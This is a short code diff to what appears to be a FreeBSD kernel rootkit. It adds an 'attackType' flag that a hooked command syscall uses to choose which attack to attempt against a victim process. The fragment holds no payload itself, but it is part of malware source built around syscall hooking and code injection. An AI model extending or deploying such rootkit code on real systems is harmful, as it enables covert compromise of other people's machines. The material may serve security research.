@@ -46,6 +46,9 @@ struct proc * victimProc = 0;
 // Flags whether malicous code has been injected
 unsigned char injected = 0;
 
+// Flags which attack should be attempted next
+unsigned char attackType = 0;
+
 // Previous system call
 void * oldRead;
 
@@ -150,6 +153,7 @@ command_hook (struct thread * td, void * syscall_args) {
   // System call arguments
   struct config_args {
     pid_t victimPID;
+    unsigned char attackType;
   };
 
   //
@@ -169,6 +173,10 @@ command_hook (struct thread * td, void * syscall_args) {
   }
   sx_sunlock(&allproc_lock);
 
+  //
+  // Set the attack type.
+  //
+  attackType = argsp->attackType;
   printf ("rootkit: Victim process %p\n", victimProc);
   return 0;
 }
